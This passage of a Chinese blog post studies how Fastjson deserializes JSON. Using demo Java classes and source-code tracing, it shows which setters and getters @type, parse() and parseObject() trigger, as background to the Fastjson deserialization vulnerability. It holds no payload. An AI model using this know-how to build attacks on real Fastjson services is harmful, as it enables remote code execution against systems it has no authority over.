<p>JSON对象其实就是一个字符串，那么在反序列化的时候，其实更像是用类去套出对象的信息，这里我认为比较像socket套接字的感觉，对于传进来的网络流，其实就是用socket库按照字段长度去“迎接”。</p>
<p>第一个没有设置Feature.SupportNonPublicField的情况下，其实也是正常去套，但是由于没有setage方法去“迎接”，那么默认就会将private塑形age初始化为0。</p>
<p>但是第二种情况下设置了Feature.SupportNonPublicField，那么其实就是更加暴力一点，我认为他会不管你有没有迎接我的函数，我直接把age=18摁进去，摁到对应的对象属性中，private也拦不住我。</p>
<p>也就是说，若想让传给JSON.parseObject()进行反序列化的JSON内容指向的对象类中的私有变量成功还原出来，则需要在调用JSON.parseObject()时加上Feature.SupportNonPublicField这个属性设置才行。</p>
<h1 id="反序列化时几种类型设置的比较"><a href="#反序列化时几种类型设置的比较" class="headerlink" title="反序列化时几种类型设置的比较"></a>反序列化时几种类型设置的比较</h1><p>再来看下parseObject()的指定或不指定反序列化类型之间的差异。</p>
<p>由于Fastjson反序列化漏洞的利用只和包含了@type的JSON数据有关，因此这里我们只对序列化时设置了SerializerFeature.WriteClassName即含有@type指定反序列化类型的JSON数据进行反序列化；对于未包含@type的情况这里不做探讨，可自行测试。</p>
<p>修改Student类，添加两个private成员变量，且所有的私有成员变量都不定义setter方法（既然是private也没必要定义）：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String address;</span><br><span class="line">    <span class="keyword">private</span> Properties properties;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"构造函数"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getName"</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getAge"</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getAddress</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getAddress"</span>);</span><br><span class="line">        <span class="keyword">return</span> address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Properties <span class="title">getProperties</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getProperties"</span>);</span><br><span class="line">        <span class="keyword">return</span> properties;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里先说一句，我又做了一个类，并且Filed都是private的，那么自然不会有setXXX方法（有的话为什么还有设置为private呢，汗😓）。</p>
<h2 id="未设置Feature-SupportNonPublicField"><a href="#未设置Feature-SupportNonPublicField" class="headerlink" title="未设置Feature.SupportNonPublicField"></a>未设置Feature.SupportNonPublicField</h2><p>那么接下来我来继续进行实验：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FJTest2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        String jsonstring =<span class="string">"&#123;\"@type\":\"fastjson2change.Student\",\"age\":66,\"name\":\"llrange\",\"address\":\"China\",\"properties\":&#123;&#125;&#125;"</span>;</span><br><span class="line">        Object obj = JSON.parseObject(jsonstring);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">        System.out.println(obj.getClass().getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">构造函数</span><br><span class="line">getProperties</span><br><span class="line">getAddress</span><br><span class="line">getAge</span><br><span class="line">getName</span><br><span class="line">getProperties</span><br><span class="line">&#123;<span class="string">"age"</span>:<span class="number">0</span>&#125;</span><br><span class="line">com.alibaba.fastjson.JSONObject</span><br></pre></td></tr></table></figure>

<p>可以看到反序列化失败，并且构造函数，getter函数都被调用了，最后的对象也是JSONObject对象（是一串字符串）。</p>
<p>记下来我改了细节，我添加一下反序列化制定的类型：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Object obj = JSON.parseObject(jsonstring, Object<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"><span class="comment">//Object obj = JSON.parseObject(jsonstring, Student.class);</span></span><br><span class="line"><span class="comment">//Student obj = JSON.parseObject(jsonstring, Student.class);</span></span><br><span class="line">System.out.println(obj);</span><br><span class="line">System.out.println(obj.getClass().getName());</span><br></pre></td></tr></table></figure>

<p>输出如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">构造函数</span><br><span class="line">getProperties</span><br><span class="line">fastjson2change.Student@<span class="number">6659</span>c656</span><br><span class="line">fastjson2change.Student</span><br></pre></td></tr></table></figure>

<p>可以看到，这次就成功了，对象被解析成了Java对象。</p>
<p>输出看到，调用了Student类的构造函数、properties成员变量的的getter方法，反序列化得到的是Student类对象即反序列化成功，也就是说<strong>只要添加了指定的类这个参数，通过@type的作用parseObject()都会成功将JSON反序列化为@type指定的类。</strong></p>
<h2 id="设置Feature-SupportNonPublicField"><a href="#设置Feature-SupportNonPublicField" class="headerlink" title="设置Feature.SupportNonPublicField"></a>设置Feature.SupportNonPublicField</h2><p>修改上一步中反序列化代码语句如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Object obj = JSON.parseObject(jsonstring, Object<span class="class">.<span class="keyword">class</span>, <span class="title">Feature</span>.<span class="title">SupportNonPublicField</span>)</span>;</span><br><span class="line"><span class="comment">//Object obj = JSON.parseObject(jsonstring, Student.class, Feature.SupportNonPublicField);</span></span><br><span class="line"><span class="comment">//Student obj = JSON.parseObject(jsonstring, Student.class, Feature.SupportNonPublicField);</span></span><br><span class="line">System.out.println(obj);</span><br><span class="line">System.out.println(obj.getClass().getName());</span><br></pre></td></tr></table></figure>

<p>输出，发现和未设置Feature.SupportNonPublicField的是一致的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">构造函数</span><br><span class="line">getProperties</span><br><span class="line">Student@<span class="number">4</span>c00c0cf</span><br><span class="line">Student</span><br></pre></td></tr></table></figure>

<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>根据前面的结果，有如下结论：</p>
<ul>
<li>当反序列化为<code>JSON.parseObject(*)</code>形式即未指定class时，会调用反序列化得到的类的构造函数、所有属性的getter方法、JSON里面的非私有属性的setter方法，其中properties属性的getter方法调用了两次；</li>
<li>当反序列化为<code>JSON.parseObject(*,*.class)</code>形式即指定class时，只调用反序列化得到的类的构造函数、JSON里面的非私有属性的setter方法、properties属性的getter方法；</li>
<li>当反序列化为<code>JSON.parseObject(*)</code>形式即未指定class进行反序列化时得到的都是JSONObject类对象，而只要指定了class即<code>JSON.parseObject(*,*.class)</code>形式得到的都是特定的Student类；</li>
</ul>
<p><strong>下面直接引用结论，Fastjson会对满足下列要求的setter/getter方法进行调用：</strong></p>
<p>满足条件的setter：</p>
<ul>
<li>函数名长度大于4且以set开头</li>
<li>非静态函数</li>
<li>返回类型为void或当前类</li>
<li>参数个数为1个</li>
</ul>
<p>满足条件的getter：</p>
<ul>
<li>函数名长度大于等于4</li>
<li>非静态方法</li>
<li>以get开头且第4个字母为大写</li>
<li>无参数</li>
<li>返回值类型继承自Collection或Map或AtomicBoolean或AtomicInteger或AtomicLong</li>
</ul>
<p>注意，除了getter方法和setter方法外，还有个is方法这里没有列举，可自行测试。</p>
<p>前面的properties私有属性，其类型为Properties，而Properties是继承于Hashtable，Hashtable是实现Map接口类的类，因此properties私有属性的getter方法时继承自Map，从而能够成功被Fastjson调用。</p>
<h2 id="小结demo"><a href="#小结demo" class="headerlink" title="小结demo"></a>小结demo</h2><p>这里我继续进行测试，跟进去看看getter和setter的区别；</p>
<p>首先上代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">tianrongxinTest</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String t1;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> t2;</span><br><span class="line">    <span class="keyword">private</span> Boolean t3;</span><br><span class="line">    <span class="keyword">private</span> Properties t4;</span><br><span class="line">    <span class="keyword">private</span> Properties t5;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">tianrongxinTest</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"tianrongxinTest() is called!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getT1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getT1() is called!"</span>);</span><br><span class="line">        <span class="keyword">return</span> t1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setT1</span><span class="params">(String t1)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"setT1() is called!"</span>);</span><br><span class="line">        <span class="keyword">this</span>.t1 = t1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getT2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getT2() is called!"</span>);</span><br><span class="line">        <span class="keyword">return</span> t2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setT2</span><span class="params">(<span class="keyword">int</span> t2)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"setT2() is called!"</span>);</span><br><span class="line">        <span class="keyword">this</span>.t2 = t2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Boolean <span class="title">getT3</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getT3() is called!"</span>);</span><br><span class="line">        <span class="keyword">return</span> t3;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setT3</span><span class="params">(Boolean t3)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"setT3() is called!"</span>);</span><br><span class="line">        <span class="keyword">this</span>.t3 = t3;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Properties <span class="title">getT4</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getT4() is called!"</span>);</span><br><span class="line">        <span class="keyword">return</span> t4;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setT4</span><span class="params">(Properties t4)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"setT4() is called!"</span>);</span><br><span class="line">        <span class="keyword">this</span>.t4 = t4;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Properties <span class="title">getT5</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getT5() is called!"</span>);</span><br><span class="line">        <span class="keyword">return</span> t5;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setT5</span><span class="params">(Properties t5)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"setT5() is called!"</span>);</span><br><span class="line">        <span class="keyword">this</span>.t5 = t5;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"tianrongxinTest&#123;"</span> +</span><br><span class="line">                <span class="string">"t1='"</span> + t1 + <span class="string">'\''</span> +</span><br><span class="line">                <span class="string">", t2="</span> + t2 +</span><br><span class="line">                <span class="string">", t3="</span> + t3 +</span><br><span class="line">                <span class="string">", t4="</span> + t4 +</span><br><span class="line">                <span class="string">", t5="</span> + t5 +</span><br><span class="line">                <span class="string">'&#125;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String jsonstr = <span class="string">"&#123;\"@type\":\"FKtemp.tianrongxinTest\",\"t1\":\"t1\",\"t2\":2,\"t3\":1,\"t4\":&#123;&#125;,\"t5\":&#123;&#125;&#125;"</span>;</span><br><span class="line">        Object obj = JSON.parse(jsonstr);</span><br><span class="line">        <span class="comment">//Object obj =JSON.parseObject(jsonstr, tianrongxinTest.class);</span></span><br><span class="line">        <span class="comment">//Object obj =JSON.parseObject(jsonstr);</span></span><br><span class="line">        String result = obj.toString();</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里参考了天融信的博客，进行了本地测试。</p>
<p>分别是上周JSON调用：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Object obj = JSON.parse(jsonstr);</span><br><span class="line">Object obj =JSON.parseObject(jsonstr, tianrongxinTest<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">Object obj =JSON.parseObject(jsonstr);</span><br></pre></td></tr></table></figure>

<p>经验1：</p>
<p>关于1和2来说，二者后面的调用链是完全一样的。二者不同点在于调用JavaBeanInfo.build()方法时传入clazz参数的来源不同；</p>
<p>JSON.parseObject(jsonstr,tianrongxinTest.class)在调用JavaBeanInfo.build() 方法时传入的clazz参数源于parseObject方法中第二个参数中指定的“tianrongxinTest.class”。</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001/image-20200716205735592.png" alt="image-20200716205735592"></p>
<p>JSON.parse(jsonstr);这种方式调用JavaBeanInfo.build() 方法时传入的clazz参数获取于json字符串中@type字段的值。</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001/640.png" alt="img"></p>
<p>因此，只要Json字符串的@type字段值与JSON.parseObject(jsonstr, FastJsonTest.class);中第二个参数中类名一致，这两种方式执行的过程与结果是完全一致的。二者唯一的区别就是获取clazz参数的途径不同。</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001/640-20200716205831059.png" alt="img"></p>
<p>经验2:</p>
<p>关于getter和setter来说，1.2.24是这样的；</p>
<p>这个问题要从JavaBeanInfo.build() 方法中获取答案：</p>
<p>程序会使用JavaBeanInfo.build() 方法对传入的json字符串进行解析。在JavaBeanInfo.build() 方法中，程序将会创建一个fieldList数组来存放后续将要处理的目标类的 setter 方法及某些特定条件的 getter 方法。通过上文的结果可见，<strong>目标类中所有的setter方法都可以被调用</strong>，程序从clazz（目标类对象）中通过getMethods获取本类以及父类或者父接口中所有的公共方法，接着进行循环判断这些方法是否可以加入fieldList中以便后续处理。</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001/640-20200716205938671.png" alt="img"></p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001/image-20200716210011363.png" alt="image-20200716210011363"></p>
<p>理解：</p>
<p>这里其实就是，对于所有的setter方法，Fastjson都直接给装填到fieldList中，再之后考察getter时候，如果发现有setter，那么就不执行getter方法了。</p>
<p>举几个例子：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001/image-20200716210355394.png" alt="image-20200716210355394"></p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001/image-20200716210543645.png" alt="image-20200716210543645"></p>
<p>经验3:</p>
<p>这里执行第三个：<code>Object obj =JSON.parseObject(jsonstr);</code></p>
<p>执行结果：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001/image-20200716211056146.png" alt="image-20200716211056146"></p>
<p>并且，返回值变成JSON对象了！</p>
<p>通过上文两种方式从执行流程几乎一样，结果也完全相同；然而使用JSON.parseObject(jsonstr)这种方式，执行的结果与返回值却与前两者不同：JSON.parseObject(jsonstr)返回值为JSONObject类对象，且将FastJsonTest类中的所有getter与setter都被调用。</p>
<p>通过阅读源码可以发现JSON.parseObject(String text)实现如下：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001/640-20200716211916696.png" alt="img"></p>
<p>parseObject(String text)其实就是先执行了parse(),随后将返回的Java对象通过JSON.toJSON（）转为 JSONObject对象。</p>
<p>JSON.toJSON（）方法会将目标类中所有getter方法记录下来，见下图：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001/640-20200716211931362.png" alt="img"></p>
<p>随后通过反射依次调用目标类中所有的getter方法：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001/640-20200716211941499.png" alt="img"></p>
<p>完整的调用链如下：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001/640-20200716211950951.png" alt="img"></p>
<p>总结：</p>
<p>上文例子中，JSON.parse(jsonstr)与JSON.parseObject(jsonstr, FastJsonTest.class)可以认为是完全一样的，而parseObject(String text)是在二者的基础上又执行了一次JSON.toJSON（）；</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001/image-20200716212010994.png" alt="image-20200716212010994"></p>
<p>此外，如果目标类中私有变量没有setter方法，但是在反序列化时仍想给这个变量赋值，则需要使用Feature.SupportNonPublicField参数。</p>
<h1 id="parse与parseObject区别"><a href="#parse与parseObject区别" class="headerlink" title="parse与parseObject区别"></a>parse与parseObject区别</h1><p>前面的demo都是用parseObject()演示的，还没说到parse()。两者主要的区别就是parseObject()返回的是JSONObject而parse()返回的是实际类型的对象.</p>
<p>当在没有对应类的定义的情况下，一般情况下都会使用JSON.parseObject()来获取数据。</p>
<blockquote>
<p>FastJson中的 parse() 和 parseObject()方法都可以用来将JSON字符串反序列化成Java对象，parseObject() 本质上也是调用 parse() 进行反序列化的。但是 parseObject() 会额外的将Java对象转为 JSONObject对象，即 JSON.toJSON()。所以进行反序列化时的细节区别在于，parse() 会识别并调用目标类的 setter 方法及某些特定条件的 getter 方法，而 parseObject() 由于多执行了 JSON.toJSON(obj)，所以在处理过程中会调用反序列化目标类的所有 setter 和 getter 方法。</p>
</blockquote>
<p>这里最好看一下源码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> JSONObject <span class="title">parseObject</span><span class="params">(String text)</span> </span>&#123;</span><br><span class="line">        Object obj = parse(text);</span><br><span class="line">        <span class="keyword">return</span> obj <span class="keyword">instanceof</span> JSONObject ? (JSONObject)obj : (JSONObject)toJSON(obj);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>parseObject({..})其实就是parse({..})的一个封装，对于parse的结果进行一次结果判定然后转化为JSONObject类型。</p>
<p>也就是说，我们用parse()反序列化会直接得到特定的类，而无需像parseObject()一样返回的是JSONObject类型的对象、还可能需要去设置第二个参数指定返回特定的类。</p>
<p>结论：</p>
<ul>
<li>parse(“”) 会识别并调用目标类的特定 setter 方法及某些特定条件的 getter 方法</li>
<li>parseObject(“”) 会调用反序列化目标类的特定 setter 和 getter 方法（此处有的博客说是所有setter，个人测试返回String的setter是不行的，此处打个问号）</li>
<li>parseObject(“”,class) 会识别并调用目标类的特定 setter 方法及某些特定条件的 getter 方法</li>
</ul>
<p>修改上一步中的parseObject()为parse()：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Object obj = JSON.parse(jsonstring);</span><br><span class="line"><span class="comment">//或以下语句，输出结果一致</span></span><br><span class="line"><span class="comment">//Object obj = JSON.parse(jsonstring, Feature.SupportNonPublicField);</span></span><br><span class="line">System.out.println(obj);</span><br><span class="line">System.out.println(obj.getClass().getName());</span><br></pre></td></tr></table></figure>

<p>输出如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">构造函数</span><br><span class="line">getProperties</span><br><span class="line">fastjson2change.Student@<span class="number">6659</span>c656</span><br><span class="line">fastjson2change.Student</span><br></pre></td></tr></table></figure>

<p>可以看到，这里我直接用的parse，没有用parseObject，也没有指定目标类，并且加不加那个冗余的参数结果都是一样，结果都是成功地反序列化为Student类对象。</p>
<p>这里我再举一个例子，先建立一个序列化实验用的Person类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="comment">//属性</span></span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String full_name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> Boolean sex;</span><br><span class="line">    <span class="keyword">private</span> Properties prop;</span><br><span class="line">    <span class="comment">//构造函数</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Person构造函数"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//set</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"setAge()"</span>);</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//get 返回Boolean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Boolean <span class="title">getSex</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getSex()"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.sex;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//get 返回ProPerties</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Properties <span class="title">getProp</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getProp()"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.prop;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//在输出时会自动调用的对象ToString函数</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        String s = <span class="string">"[Person Object] name="</span> + <span class="keyword">this</span>.name + <span class="string">" full_name="</span> + <span class="keyword">this</span>.full_name  + <span class="string">", age="</span> + <span class="keyword">this</span>.age + <span class="string">", prop="</span> + <span class="keyword">this</span>.prop + <span class="string">", sex="</span> + <span class="keyword">this</span>.sex;</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再写一个反序列化类来调用他：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">type</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String eneity3 = <span class="string">"&#123;\"被屏蔽的type\":\"fastjson2change.Person\", \"name\":\"lala\", \"full_name\":\"lalalolo\", \"age\": 13, \"prop\": &#123;\"123\":123&#125;, \"sex\": 1&#125;"</span>;</span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        Object obj = JSON.parseObject(eneity3,Person<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        <span class="comment">//输出会调用obj对象的tooString函数</span></span><br><span class="line">        System.out.println(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Person构造函数</span><br><span class="line">setAge()</span><br><span class="line">getProp()</span><br><span class="line">[Person Object] name=lala full_name=<span class="keyword">null</span>, age=<span class="number">13</span>, prop=<span class="keyword">null</span>, sex=<span class="keyword">null</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> name 反序列化成功</span><br><span class="line"><span class="keyword">private</span> full_name 反序列化失败</span><br><span class="line"><span class="keyword">private</span> age setAge函数被调用</span><br><span class="line"><span class="keyword">private</span> sex getsex函数没有被调用</span><br><span class="line"><span class="keyword">private</span> prop getprop函数被成功调用</span><br></pre></td></tr></table></figure>

<p>可以得知：</p>
<ul>
<li>public修饰符的属性会进行反序列化赋值，private修饰符的属性不会直接进行反序列化赋值，而是会调用setxxx(xxx为属性名)的函数进行赋值。</li>
<li>getxxx(xxx为属性名)的函数会根据函数返回值的不同，而选择被调用或不被调用</li>
</ul>
<p>这里调试一下，跟进去看看，可以看到下图位置处针对我们的@type进行定向解析：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001/image-20200624114114569.png" alt="image-20200624114114569"></p>
<p>决定这个set/get函数是否将被调用的代码最终在<code>com.alibaba.fastjson.util.JavaBeanInfo#build</code>函数处</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001/image-20200624120125884.png" alt="image-20200624120125884"></p>
<p>继续跟，继续跟。。。</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001/image-20200624120447372.png" alt="image-20200624120447372"></p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001/image-20200624121013685.png" alt="image-20200624121013685"></p>
<p>接下来是一堆判断条件：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001/image-20200624121144284.png" alt="image-20200624121144284"></p>
<p>在进入build函数后会遍历一遍传入class的所有方法，去寻找满足set开头的特定类型方法；再遍历一遍所有方法去寻找get开头的特定类型的方法。</p>
<p><strong>set开头的方法要求如下：</strong></p>
<ul>
<li>方法名长度大于4且以set开头，且第四个字母要是大写</li>
<li>非静态方法</li>
<li>返回类型为void或当前类</li>
<li>参数个数为1个</li>
</ul>
<p>寻找到符合要求的set开头的方法后会根据一定规则提取方法名后的变量名（好像会过滤_，就是set_name这样的方法名中的下划线会被略过，得到name）。再去跟这个类的属性去比对有没有这个名称的属性。</p>
<p>如果没有这个属性并且这个set方法的输入是一个布尔型（是boolean类型，不是Boolean类型，这两个是不一样的），会重新给属性名前面加上<strong>is</strong>，再取头两个字符，第一个字符为大写（即isNa），去寻找这个属性名。</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001/image-20200624121614209.png" alt="image-20200624121614209"></p>
<p>这里的is就是有的网上有的文章中说反序列化会自动调用get、set、is方法的由来。个人觉得这种说法应该是错误的。</p>
<p>真实情况应该是确认存在符合setXxx方法后，会与这个方法绑定一个xxx属性，如果xxx属性不存在则会绑定isXx属性（这里is后第一个字符需要大写，才会被绑定）。并没有调用is开头的方法</p>
<p>自己从源码中分析或者尝试在类中添加isXx方法都是不会被调用的，这里只是为了指出其他文章中的一个错误。这个与调用的set方法绑定的属性，再之后并没有发现对于调用过程有什么影响。</p>
<p><strong>所以只要目标类中有满足条件的set方法，然后得到的方法变量名存在于序列化字符串中，这个set方法就可以被调用。</strong></p>
<p><strong>get开头的方法要求如下：</strong></p>
<ul>
<li>方法名长度大于等于4</li>
<li>非静态方法</li>
<li>以get开头且第4个字母为大写</li>
<li>无传入参数</li>
<li>返回值类型继承自Collection/Map/AtomicBoolean/AtomicInteger AtomicLong</li>
</ul>
<p>所以我们上面例子中的getsex方法没有被调用是因为返回类型不符合，而getprop方法被成功调用是因为Properties 继承 Hashtable，而Hashtable实现了Map接口，返回类型符合条件。</p>
<p>再顺便看一下最后触发方法调用的地方com.alibaba.fastjson.parser.deserializer.FieldDeserializer#setValue，（在被调用的方法中下断点即可）</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001/image-20200624122556545.png" alt="image-20200624122556545"></p>
<p>那么至此我们可以知道</p>
<ul>
<li>@type可以指定反序列化成服务器上的任意类</li>
<li>然后服务端会解析这个类，提取出这个类中符合要求的setter方法与getter方法（如setxxx）</li>
